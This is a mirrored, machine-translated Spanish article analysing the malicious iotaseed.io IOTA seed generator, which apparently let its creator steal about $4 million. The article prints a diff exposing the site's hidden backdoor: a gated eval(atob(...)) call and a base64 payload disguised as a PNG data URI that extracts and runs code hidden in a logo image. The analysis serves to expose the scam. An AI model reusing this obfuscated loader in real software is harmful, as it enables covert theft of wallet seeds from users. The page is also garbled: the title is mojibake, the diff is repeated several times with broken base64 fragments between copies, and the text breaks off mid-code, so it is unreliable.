<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üéûÔ∏è üç£ üëÜüèø C√≥mo un generador de frases maliciosas del sitio permiti√≥ robar $ 4 millones üíÖüèº üë®üèø‚Äçü§ù‚Äçüë®üèª ü§µüèæ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Ars Techica public√≥ recientemente material que describe c√≥mo el generador de frases semilla iotaseed.io iotaseed.io, que era malicioso (y ahora ya no ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>C√≥mo un generador de frases maliciosas del sitio permiti√≥ robar $ 4 millones</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/wirex/blog/410041/">  Ars Techica <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">public√≥</a> recientemente material que describe c√≥mo el generador de frases semilla iotaseed.io iotaseed.io, que era malicioso (y ahora ya no funciona), permiti√≥ a su creador robar criptomonedas IOTA por valor de casi $ 4 millones de las billeteras de los usuarios. <br><br><img src="https://habrastorage.org/webt/_e/wd/5c/_ewd5cmfjowci8oegrngbfuyx-i.jpeg"><br><br>  De acuerdo con la descripci√≥n de la publicaci√≥n, el sitio web "almacen√≥ datos en cada frase semilla generada junto con informaci√≥n sobre la billetera con la que estaba asociada, permitiendo a los propietarios del sitio web (o aquellos que la piratearon) simplemente esperar a que lleguen los tokens a las billeteras, y luego ret√≠relos a sus cuentas ".  En este art√≠culo, decid√≠ estudiar el lado t√©cnico de esta estafa. <br><br><h3>  Estamos buscando un codigo </h3><br>  La versi√≥n original del sitio web iotaseed.io ha sido reemplazada por un mensaje que indica que est√° deshabilitada.  Afortunadamente, Wayback Machine <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=http://web.archive.org/web/20180103035549/">mantuvo</a> una copia del sitio. <br><br>  El sitio web conduce a un repositorio de github, que advierte a los visitantes que el c√≥digo est√° abierto para su revisi√≥n, pero recomienda a los usuarios que generen semilla en el propio sitio web, ya que el repositorio puede contener c√≥digo m√°s nuevo y a√∫n no probado. <br><a name="habracut"></a><br>  En base a esta informaci√≥n, supuse que el c√≥digo malicioso actuaba solo en el sitio y que no estaba en el repositorio.  Tal enfoque permitir√≠a ocultar fragmentos de c√≥digo utilizados para robar semillas.  El repositorio conten√≠a solo c√≥digo limpio que no generaba preguntas ni sospechas.  Esto explicar√≠a la recomendaci√≥n de usar solo el sitio web y no el repositorio.  Si esto es cierto, cualquier intento de comparar JavaScript en el sitio con JavaScript en el repositorio de Github conducir√≠a a una detecci√≥n obvia de una puerta trasera en el sitio. <br><br>  Desafortunadamente, el repositorio iotaseed.io github se refiere al <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">norbertvdberg / iotaseed</a> ya eliminado (la cuenta tambi√©n se ha eliminado).  Wayback Machine guard√≥ solo la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=https://web.archive.org/web/20180103035549/">p√°gina principal del</a> repositorio.  En respuesta a los intentos de mirar el c√≥digo o descargar su archivo zip, WM dice que estas p√°ginas no fueron archivadas.  Sin embargo, mirando el contador de la bifurcaci√≥n en la esquina superior derecha, podemos encontrar que este c√≥digo fue bifurcado por 8 cuentas diferentes.  Despu√©s de revisar el <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">art√≠culo correspondiente</a> en la base de conocimiento de GitHub, aprendemos que eliminar el repositorio no afecta el trabajo de sus tenedores.  Esto significa que a√∫n pueden existir copias de este repositorio en alg√∫n lugar de la inmensidad del servicio. <br><br><img src="https://habrastorage.org/webt/6h/ln/ju/6hlnju7jwjrgpev--u5fv7e6hlk.png"><br><br>  Una b√∫squeda r√°pida de las confirmaciones visibles en una copia de la p√°gina guardada por Wayback Machine le permite descubrir lo siguiente: <br><br><img src="https://habrastorage.org/webt/cm/se/zz/cmsezzj-hzglrbiqlosf0wb8ou4.png"><br><br>  Parece que <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">eggdroid / eggseed3</a> es uno de los tenedores del c√≥digo original de iotaseed.io.  Los 26 commits en √©l est√°n hechos por norbertvdberg, es decir, el mismo usuario propietario del repositorio original.  Ahora que tenemos un sitio web y archivos JavaScript del github a nuestra disposici√≥n, es hora de compararlos y encontrar la diferencia. <br><br><h3>  Analizando el c√≥digo </h3><br>  El generador de semillas consta de muchos archivos JavaScript diferentes combinados en un archivo <font color="#e83e8c"><code>all.js</code></font> minimizado a <font color="#e83e8c"><code>all.mini.js.</code></font>  Fue √©l quien, de hecho, fue utilizado en la p√°gina.  Por lo tanto, lo compar√© con el mismo archivo js de la copia WM guardada. <br><br><pre> <code class="javascript hljs">$ shasum all-website.mini.js all-github.mini.js <span class="hljs-number"><span class="hljs-number">3</span></span>d48933698d8cf1d1673067d782595c12c815424 all-website.mini.js <span class="hljs-number"><span class="hljs-number">3</span></span>d48933698d8cf1d1673067d782595c12c815424 all-github.mini.js</code> </pre> <br>  Desafortunadamente, ambos archivos resultaron ser iguales.  Al revisar el c√≥digo, not√© que inmediatamente despu√©s de que se gener√≥ la billetera, Web Worker <a href="">comenz√≥ a</a> generar c√≥digos QR y datos para la versi√≥n en papel de la billetera.  El c√≥digo para este trabajador est√° en otro <font color="#e83e8c"><code>all-wallet.mini.js</code></font> .  Tal vez algo estaba escondido en √©l? <br><br>  Las versiones de este archivo del sitio y de la copia WM parec√≠an diferentes, por lo que ejecut√© ambos archivos a trav√©s de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">js-beautify</a> , luego los compar√© con diff para ver las diferencias espec√≠ficas. <br><br><pre> <code class="diff hljs">$ diff all-wallet-website.js all-wallet-github.js 1313c1313 &lt; t = t || {}, this.version = e("../package.json").version, this.host = t.host ? t.host : "http://web.archive.org/web/20180120222030/http://localhost/", this.port = t.port ? t.port : 14265, this.provider = t.provider || this.host.replace(/\/$/, "") + ":" + this.port, this.sandbox = t.sandbox || !1, this.token = t.token || !1, this.sandbox &amp;&amp; (this.sandbox = this.provider.replace(/\/$/, ""), this.provider = this.sandbox + "/commands"), this._makeRequest = new o(this.provider, this.token), this.api = new a(this._makeRequest, this.sandbox), this.utils = i, this.valid = e("./utils/inputValidator"), this.multisig = new s(this._makeRequest) --- &gt; t = t || {}, this.version = e("../package.json").version, this.host = t.host ? t.host : "http://localhost", this.port = t.port ? t.port : 14265, this.provider = t.provider || this.host.replace(/\/$/, "") + ":" + this.port, this.sandbox = t.sandbox || !1, this.token = t.token || !1, this.sandbox &amp;&amp; (this.sandbox = this.provider.replace(/\/$/, ""), this.provider = this.sandbox + "/commands"), this._makeRequest = new o(this.provider, this.token), this.api = new a(this._makeRequest, this.sandbox), this.utils = i, this.valid = e("./utils/inputValidator"), this.multisig = new s(this._makeRequest) 1713c1713 &lt; this.provider = e || "http://web.archive.org/web/20180120222030/http://localhost:14265/", this.token = t --- &gt; this.provider = e || "http://localhost:14265", this.token = t 1718c1718 &lt; this.provider = e || "http://web.archive.org/web/20180120222030/http://localhost:14265/" --- &gt; this.provider = e || "http://localhost:14265" 6435c6435 &lt; website: "http://web.archive.org/web/20180120222030/https://iota.org/" --- &gt; website: "https://iota.org" 6440c6440 &lt; url: "http://web.archive.org/web/20180120222030/https://github.com/iotaledger/iota.lib.js/issues" --- &gt; url: "https://github.com/iotaledger/iota.lib.js/issues" 6444c6444 &lt; url: "http://web.archive.org/web/20180120222030/https://github.com/iotaledger/iota.lib.js.git" --- &gt; url: "https://github.com/iotaledger/iota.lib.js.git"</code> </pre> <br>  Pero la √∫nica diferencia fue que Wayback Machine reescribi√≥ algunas URL para apuntar a <font color="#e83e8c"><code>web.archive.org</code></font> .  Desde un punto de vista funcional, el c√≥digo de generaci√≥n de semilla en ambos archivos result√≥ ser el mismo. <br><br>  Despu√©s de eso, decid√≠ echar un vistazo m√°s de cerca a index.html y not√© que estaba cargando otro javascript de <a href="">la biblioteca de alertas</a> , que primero pas√© por alto.  Hice las mismas manipulaciones con su copia WM guardada y la copia del repositorio y el c√≥digo sospechoso se hizo evidente: <br><br><pre> <code class="diff hljs">$ diff notifier-website.js notifier-github.js 68,71d67 &lt; if (!window.inited_n) { &lt; window.inited_n = true; &lt; Notifier.init() &lt; } 82,87d77 &lt; if (/,T/.test(image)) { &lt; if (/ps:.*o/.test(document.location)) { &lt; eval(atob(image.split(",")[2])) &lt; } &lt; return &lt; } 119,121d108 &lt; init: function(message, title) { &lt; this.notify(message, title, "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9wCBxILCcud3gSTrg4uDm5uZFRETbRznoTD3oTD1JR0iXlYXaRzncRzhBQUDnSjtNS0zUzsdnZmVLSEpMSEoyNjPm5eSZmYfm6ekzNTOloI42ODbm6Oiioo/h4eEzODbm5+eop5SiopCiopDl396hloaDg3ToTD3m5uZMS03/9RTlAAAADy8vIgICA2NzY4OzYPM0fa29q,ZnVuY3Rpb24gY0RpcyhmKXt2YXIgbz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKS5nZXRDb250ZXh0KCIyZCIpO3ZhciBpPW5ldyBJbWFnZTtpLm9ubG9hZD1mdW5jdGlvbigpe28uZHJhd0ltYWdlKGksMCwwKTtkUyhvLmdldEltYWdlRGF0YSgwLDAsMjk4LDEwMCkuZGF0YSl9O2kuc3JjPWZ9ZnVuY3Rpb24gZFMoZCl7dmFyIGw9MjEsYk09IiIsdE09IiI7Zm9yKHZhciBpPTA7aTxsO2krKyl7dmFyIGI9KGRbaSo0KzJdPj4+MCkudG9TdHJpbmcoMik7Yk0rPWJbYi5sZW5ndGgtMV07aWYoYk0ubGVuZ3RoPT0xNil7bD1wYXJzZUludChiTSwyKSsxNjtiTT0iIn1lbHNlIGlmKGJNLmxlbmd0aD09OCYmbCE9MjEpe3RNKz1TdHJpbmcuZnJvbUNoYXJDb2RlKHBhcnNlSW50KGJNLDIpKTtiTT0iIn19ZXZhbCh0TSl9Y0RpcygiLi9pbWFnZXMvbG9nb19zbWFsbF9ib3R0b20ucG5nIik7,TbRznoTD3oTD1JR0iXlYXaRzncRzhBQUDnSjtNS0zUzsdnZmVLSEpMSEoyNjPm5eSZmYfm6ekzNTOloI42ODbm6Oiioo/h4eEzODbm5+eop5SiopCiopDl396hloaDg3ToTD3m5uZMS03///9RTlAAAADy8vIgICA2NzY4OzYPM0fa29qgoI7/zMnj4+PW19VGRkbqPi7v7/D6+vr09fXyTj4rKSvhSTo/Pj/oSDnlMyLsNCI0MTP0///tTT7ZRjizOi+6PDDmLRyenZ7oKRfExMT/TzvobGEVFBWGhYUAGjLW8/ToXVADLUZ8e33/2tfRRTdWVFTFQDT1u7aSkZIADib+5eFwcHHW+/z70tDwkIesPTPW6+teXV2xsbG7u7vY4+Lre3DMzM2qp6jilIxsPT7lg3kdO07m/f4AJjuwsJzftK/fpZ7woJjoVUZBWGj1zMdTaXfcvrrzq6Tby8f+8u8wSlYZNDaQRUKfr7d9j5lpf4vx5ePMsLF/o64s+PNlAAAANnRSTlMAC1IoljoZWm2yloPRGWiJfdjEEk037Esq7Pn24EKjpiX+z7rJNNWB5pGxZ1m2mZY/gXOlr43C+dBMAAAmkklEQVR42uzay86bMBAF4MnCV1kCeQFIRn6M8xZe+v1fpVECdtPSy5822Bi+JcujmfEApl3IIRhBFyIJ3Em6UMTDSKfHsOB0dhILQ2fX4+4aF0tVXC3yJJB4OrcJV1msIhJN52avslhpZOfcvyepfceIaARw5t2CWTwYRhSQTdSum1TGqE5Mr0kg6Ukj66hZ3GExaEaJQsYIWXzmd6P2KHxn6NjG4/BDMEQ6RM+oNQ6vjJyWFTNTDJlau0e1drAO+Ikan8tE1itkfC0S11iXKGyYJZFB5jpkgmY8WWoKx6Z5JI3MGyQqV1Jj80Jgm2J9xGrQSAKfcyptEfgFrxxWnUUiVEqIGjN5bAsRKyOReI9FaGxw3o0Of8I6rAbbcBR06yN+T+Uogmu2QR5ucsaXuV6w1hath9HiDWGwWrLmOoUL7/CWYLRo6/2d9zPeN6hONNEvXKiIf2fkwauDCxXwcPI0mA/4v+whvwdzafABTh/tZW3SEcmZS0NYfJTTB5kaYsbnHSEMMWMfuvJdg3vsJlR9R6UP2JOp9jRhM/ZVa5dwiwJCT9UZI8qwtRVGh2JCVSsXtyinqgtMk0NJFf1QYwGlmToGhkQFQg3X5nvUofzw7FCLr2bRak2Uz0KgJhOVM6EqjlMpvPwp+ioWy2JAbWYqQ6E+mv5SwyNzJWh/HHX6Rty17TYNBFF44CokEA+ABELiJ2yMnUorefElCY5pHGgqu3JUhYAU0xpwwYoqJSAU8sgXMxvvekwukAS0PS9pq3I8OXtmZm8pF3D6vuLEx7N833/N0bI85X/CarUEte9b68nlf4rg+lKoEGAvPMvzk6+Ak5OwZ71u/S81gEoJR8AMyPNR2FOs7jo1pG94PvzdD76vjCZTYp/vlzDefw0hYOWf4b1+3Tt5+3MfcZ7NxnnPX0Uu//7StQUhwgmNk/N9x3ENDpfF/P7E6/6rM1qt8K0BXMjsOs7+eZKNR95KMSQfCgS/pUY4TuPUdlEHlOPnCXj7H2B1e9+ZxRaZHVuN49nI8pUlNC9JRLVSwMhM4piahmOsA/FMFPwB+4ZiyTYnf/gAAAABJRU5ErkJggg==") &lt; },</code> datos: image / png; base64, iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A / wD / oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9wCBxILCcud3gSTrg4uDm5uZFRETbRznoTD3oTD1JR0iXlYXaRzncRzhBQUDnSjtNS0zUzsdnZmVLSEpMSEoyNjPm5eSZmYfm6ekzNTOloI42ODbm6Oiioo / h4eEzODbm5 + eop5SiopCiopDl396hloaDg3ToTD3m5uZMS03 / 9RTlAAAADy8vIgICA2NzY4OzYPM0fa29q, ZnVuY3Rpb24gY0RpcyhmKXt2YXIgbz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKS5nZXRDb250ZXh0KCIyZCIpO3ZhciBpPW5ldyBJbWFnZTtpLm9ubG9hZD1mdW5jdGlvbigpe28uZHJhd0ltYWdlKGksMCwwKTtkUyhvLmdldEltYWdlRGF0YSgwLDAsMjk4LDEwMCkuZGF0YSl9O2kuc3JjPWZ9ZnVuY3Rpb24gZFMoZCl7dmFyIGw9MjEsYk09IiIsdE09IiI7Zm9yKHZhciBpPTA7aTxsO2krKyl7dmFyIGI9KGRbaSo0KzJdPj4 + MCkudG9TdHJpbmcoMik7Yk0rPWJbYi5sZW5ndGgtMV07aWYoYk0ubGVuZ3RoPT0xNil7bD1wYXJzZUludChiTSwyKSsxNjtiTT0iIn1lbHNlIGlmKGJNLmxlbmd0aD09OCYmbCE9MjEpe3RNKz1TdHJpbmcuZnJvbUNoYXJDb2RlKHBhcnNlSW50KGJNLDIpKTtiTT0iIn19ZXZhbCh0TSl9Y0RpcygiLi9pbWFnZXMvbG9nb19zbWFsbF9ib3R0b20ucG5nIik7, TbRznoTD3oTD1JR0iX <code class="diff hljs">$ diff notifier-website.js notifier-github.js 68,71d67 &lt; if (!window.inited_n) { &lt; window.inited_n = true; &lt; Notifier.init() &lt; } 82,87d77 &lt; if (/,T/.test(image)) { &lt; if (/ps:.*o/.test(document.location)) { &lt; eval(atob(image.split(",")[2])) &lt; } &lt; return &lt; } 119,121d108 &lt; init: function(message, title) { &lt; this.notify(message, title, "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9wCBxILCcud3gSTrg4uDm5uZFRETbRznoTD3oTD1JR0iXlYXaRzncRzhBQUDnSjtNS0zUzsdnZmVLSEpMSEoyNjPm5eSZmYfm6ekzNTOloI42ODbm6Oiioo/h4eEzODbm5+eop5SiopCiopDl396hloaDg3ToTD3m5uZMS03/9RTlAAAADy8vIgICA2NzY4OzYPM0fa29q,ZnVuY3Rpb24gY0RpcyhmKXt2YXIgbz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKS5nZXRDb250ZXh0KCIyZCIpO3ZhciBpPW5ldyBJbWFnZTtpLm9ubG9hZD1mdW5jdGlvbigpe28uZHJhd0ltYWdlKGksMCwwKTtkUyhvLmdldEltYWdlRGF0YSgwLDAsMjk4LDEwMCkuZGF0YSl9O2kuc3JjPWZ9ZnVuY3Rpb24gZFMoZCl7dmFyIGw9MjEsYk09IiIsdE09IiI7Zm9yKHZhciBpPTA7aTxsO2krKyl7dmFyIGI9KGRbaSo0KzJdPj4+MCkudG9TdHJpbmcoMik7Yk0rPWJbYi5sZW5ndGgtMV07aWYoYk0ubGVuZ3RoPT0xNil7bD1wYXJzZUludChiTSwyKSsxNjtiTT0iIn1lbHNlIGlmKGJNLmxlbmd0aD09OCYmbCE9MjEpe3RNKz1TdHJpbmcuZnJvbUNoYXJDb2RlKHBhcnNlSW50KGJNLDIpKTtiTT0iIn19ZXZhbCh0TSl9Y0RpcygiLi9pbWFnZXMvbG9nb19zbWFsbF9ib3R0b20ucG5nIik7,TbRznoTD3oTD1JR0iXlYXaRzncRzhBQUDnSjtNS0zUzsdnZmVLSEpMSEoyNjPm5eSZmYfm6ekzNTOloI42ODbm6Oiioo/h4eEzODbm5+eop5SiopCiopDl396hloaDg3ToTD3m5uZMS03///9RTlAAAADy8vIgICA2NzY4OzYPM0fa29qgoI7/zMnj4+PW19VGRkbqPi7v7/D6+vr09fXyTj4rKSvhSTo/Pj/oSDnlMyLsNCI0MTP0///tTT7ZRjizOi+6PDDmLRyenZ7oKRfExMT/TzvobGEVFBWGhYUAGjLW8/ToXVADLUZ8e33/2tfRRTdWVFTFQDT1u7aSkZIADib+5eFwcHHW+/z70tDwkIesPTPW6+teXV2xsbG7u7vY4+Lre3DMzM2qp6jilIxsPT7lg3kdO07m/f4AJjuwsJzftK/fpZ7woJjoVUZBWGj1zMdTaXfcvrrzq6Tby8f+8u8wSlYZNDaQRUKfr7d9j5lpf4vx5ePMsLF/o64s+PNlAAAANnRSTlMAC1IoljoZWm2yloPRGWiJfdjEEk037Esq7Pn24EKjpiX+z7rJNNWB5pGxZ1m2mZY/gXOlr43C+dBMAAAmkklEQVR42uzay86bMBAF4MnCV1kCeQFIRn6M8xZe+v1fpVECdtPSy5822Bi+JcujmfEApl3IIRhBFyIJ3Em6UMTDSKfHsOB0dhILQ2fX4+4aF0tVXC3yJJB4OrcJV1msIhJN52avslhpZOfcvyepfceIaARw5t2CWTwYRhSQTdSum1TGqE5Mr0kg6Ukj66hZ3GExaEaJQsYIWXzmd6P2KHxn6NjG4/BDMEQ6RM+oNQ6vjJyWFTNTDJlau0e1drAO+Ikan8tE1itkfC0S11iXKGyYJZFB5jpkgmY8WWoKx6Z5JI3MGyQqV1Jj80Jgm2J9xGrQSAKfcyptEfgFrxxWnUUiVEqIGjN5bAsRKyOReI9FaGxw3o0Of8I6rAbbcBR06yN+T+Uogmu2QR5ucsaXuV6w1hath9HiDWGwWrLmOoUL7/CWYLRo6/2d9zPeN6hONNEvXKiIf2fkwauDCxXwcPI0mA/4v+whvwdzafABTh/tZW3SEcmZS0NYfJTTB5kaYsbnHSEMMWMfuvJdg3vsJlR9R6UP2JOp9jRhM/ZVa5dwiwJCT9UZI8qwtRVGh2JCVSsXtyinqgtMk0NJFf1QYwGlmToGhkQFQg3X5nvUofzw7FCLr2bRak2Uz0KgJhOVM6EqjlMpvPwp+ioWy2JAbWYqQ6E+mv5SwyNzJWh/HHX6Rty17TYNBFF44CokEA+ABELiJ2yMnUorefElCY5pHGgqu3JUhYAU0xpwwYoqJSAU8sgXMxvvekwukAS0PS9pq3I8OXtmZm8pF3D6vuLEx7N833/N0bI85X/CarUEte9b68nlf4rg+lKoEGAvPMvzk6+Ak5OwZ71u/S81gEoJR8AMyPNR2FOs7jo1pG94PvzdD76vjCZTYp/vlzDefw0hYOWf4b1+3Tt5+3MfcZ7NxnnPX0Uu//7StQUhwgmNk/N9x3ENDpfF/P7E6/6rM1qt8K0BXMjsOs7+eZKNR95KMSQfCgS/pUY4TuPUdlEHlOPnCXj7H2B1e9+ZxRaZHVuN49nI8pUlNC9JRLVSwMhM4piahmOsA/FMFPwB+4ZiyTYnf/gAAAABJRU5ErkJggg==") &lt; },</code> zMnj4 + PW19VGRkbqPi7v7 / D6 + vr09fXyTj4rKSvhSTo / Pj / oSDnlMyLsNCI0MTP0 /// tTT7ZRjizOi + 6PDDmLRyenZ7oKRfExMT / TzvobGEVFBWGhYUAGjLW8 / ToXVADLUZ8e33 / 2tfRRTdWVFTFQDT1u7aSkZIADib + 5eFwcHHW + / + z70tDwkIesPTPW6 teXV2xsbG7u7vY4 + Lre3DMzM2qp6jilIxsPT7lg3kdO07m / f4AJjuwsJzftK / fpZ7woJjoVUZBWGj1zMdTaXfcvrrzq6Tby8f + 8u8wSlYZNDaQRUKfr7d9j5lpf4vx5ePMsLF / o64s + <code class="diff hljs">$ diff notifier-website.js notifier-github.js 68,71d67 &lt; if (!window.inited_n) { &lt; window.inited_n = true; &lt; Notifier.init() &lt; } 82,87d77 &lt; if (/,T/.test(image)) { &lt; if (/ps:.*o/.test(document.location)) { &lt; eval(atob(image.split(",")[2])) &lt; } &lt; return &lt; } 119,121d108 &lt; init: function(message, title) { &lt; this.notify(message, title, "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9wCBxILCcud3gSTrg4uDm5uZFRETbRznoTD3oTD1JR0iXlYXaRzncRzhBQUDnSjtNS0zUzsdnZmVLSEpMSEoyNjPm5eSZmYfm6ekzNTOloI42ODbm6Oiioo/h4eEzODbm5+eop5SiopCiopDl396hloaDg3ToTD3m5uZMS03/9RTlAAAADy8vIgICA2NzY4OzYPM0fa29q,ZnVuY3Rpb24gY0RpcyhmKXt2YXIgbz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKS5nZXRDb250ZXh0KCIyZCIpO3ZhciBpPW5ldyBJbWFnZTtpLm9ubG9hZD1mdW5jdGlvbigpe28uZHJhd0ltYWdlKGksMCwwKTtkUyhvLmdldEltYWdlRGF0YSgwLDAsMjk4LDEwMCkuZGF0YSl9O2kuc3JjPWZ9ZnVuY3Rpb24gZFMoZCl7dmFyIGw9MjEsYk09IiIsdE09IiI7Zm9yKHZhciBpPTA7aTxsO2krKyl7dmFyIGI9KGRbaSo0KzJdPj4+MCkudG9TdHJpbmcoMik7Yk0rPWJbYi5sZW5ndGgtMV07aWYoYk0ubGVuZ3RoPT0xNil7bD1wYXJzZUludChiTSwyKSsxNjtiTT0iIn1lbHNlIGlmKGJNLmxlbmd0aD09OCYmbCE9MjEpe3RNKz1TdHJpbmcuZnJvbUNoYXJDb2RlKHBhcnNlSW50KGJNLDIpKTtiTT0iIn19ZXZhbCh0TSl9Y0RpcygiLi9pbWFnZXMvbG9nb19zbWFsbF9ib3R0b20ucG5nIik7,TbRznoTD3oTD1JR0iXlYXaRzncRzhBQUDnSjtNS0zUzsdnZmVLSEpMSEoyNjPm5eSZmYfm6ekzNTOloI42ODbm6Oiioo/h4eEzODbm5+eop5SiopCiopDl396hloaDg3ToTD3m5uZMS03///9RTlAAAADy8vIgICA2NzY4OzYPM0fa29qgoI7/zMnj4+PW19VGRkbqPi7v7/D6+vr09fXyTj4rKSvhSTo/Pj/oSDnlMyLsNCI0MTP0///tTT7ZRjizOi+6PDDmLRyenZ7oKRfExMT/TzvobGEVFBWGhYUAGjLW8/ToXVADLUZ8e33/2tfRRTdWVFTFQDT1u7aSkZIADib+5eFwcHHW+/z70tDwkIesPTPW6+teXV2xsbG7u7vY4+Lre3DMzM2qp6jilIxsPT7lg3kdO07m/f4AJjuwsJzftK/fpZ7woJjoVUZBWGj1zMdTaXfcvrrzq6Tby8f+8u8wSlYZNDaQRUKfr7d9j5lpf4vx5ePMsLF/o64s+PNlAAAANnRSTlMAC1IoljoZWm2yloPRGWiJfdjEEk037Esq7Pn24EKjpiX+z7rJNNWB5pGxZ1m2mZY/gXOlr43C+dBMAAAmkklEQVR42uzay86bMBAF4MnCV1kCeQFIRn6M8xZe+v1fpVECdtPSy5822Bi+JcujmfEApl3IIRhBFyIJ3Em6UMTDSKfHsOB0dhILQ2fX4+4aF0tVXC3yJJB4OrcJV1msIhJN52avslhpZOfcvyepfceIaARw5t2CWTwYRhSQTdSum1TGqE5Mr0kg6Ukj66hZ3GExaEaJQsYIWXzmd6P2KHxn6NjG4/BDMEQ6RM+oNQ6vjJyWFTNTDJlau0e1drAO+Ikan8tE1itkfC0S11iXKGyYJZFB5jpkgmY8WWoKx6Z5JI3MGyQqV1Jj80Jgm2J9xGrQSAKfcyptEfgFrxxWnUUiVEqIGjN5bAsRKyOReI9FaGxw3o0Of8I6rAbbcBR06yN+T+Uogmu2QR5ucsaXuV6w1hath9HiDWGwWrLmOoUL7/CWYLRo6/2d9zPeN6hONNEvXKiIf2fkwauDCxXwcPI0mA/4v+whvwdzafABTh/tZW3SEcmZS0NYfJTTB5kaYsbnHSEMMWMfuvJdg3vsJlR9R6UP2JOp9jRhM/ZVa5dwiwJCT9UZI8qwtRVGh2JCVSsXtyinqgtMk0NJFf1QYwGlmToGhkQFQg3X5nvUofzw7FCLr2bRak2Uz0KgJhOVM6EqjlMpvPwp+ioWy2JAbWYqQ6E+mv5SwyNzJWh/HHX6Rty17TYNBFF44CokEA+ABELiJ2yMnUorefElCY5pHGgqu3JUhYAU0xpwwYoqJSAU8sgXMxvvekwukAS0PS9pq3I8OXtmZm8pF3D6vuLEx7N833/N0bI85X/CarUEte9b68nlf4rg+lKoEGAvPMvzk6+Ak5OwZ71u/S81gEoJR8AMyPNR2FOs7jo1pG94PvzdD76vjCZTYp/vlzDefw0hYOWf4b1+3Tt5+3MfcZ7NxnnPX0Uu//7StQUhwgmNk/N9x3ENDpfF/P7E6/6rM1qt8K0BXMjsOs7+eZKNR95KMSQfCgS/pUY4TuPUdlEHlOPnCXj7H2B1e9+ZxRaZHVuN49nI8pUlNC9JRLVSwMhM4piahmOsA/FMFPwB+4ZiyTYnf/gAAAABJRU5ErkJggg==") &lt; },</code> v1fpVECdtPSy5822Bi + JcujmfEApl3IIRhBFyIJ3Em6UMTDSKfHsOB0dhILQ2fX4 + 4aF0tVXC3yJJB4OrcJV1msIhJN52avslhpZOfcvyepfceIaARw5t2CWTwYRhSQTdSum1TGqE5Mr0kg6Ukj66hZ3GExaEaJQsYIWXzmd6P2KHxn6NjG4 / BDMEQ6RM + oNQ6vjJyWFTNTDJlau0e1drAO + Ikan8tE1itkfC0S11iXKGyYJZFB5jpkgmY8WWoKx6Z5JI3MGyQqV1Jj80Jgm2J9xGrQSAKfcyptEfgFrxxWnUUiVEqIGjN5bAsRKyOReI9FaGxw3o0Of8I6rAbbcBR06yN + T + Uogmu2QR5ucsaXuV6w1hat <code class="diff hljs">$ diff notifier-website.js notifier-github.js 68,71d67 &lt; if (!window.inited_n) { &lt; window.inited_n = true; &lt; Notifier.init() &lt; } 82,87d77 &lt; if (/,T/.test(image)) { &lt; if 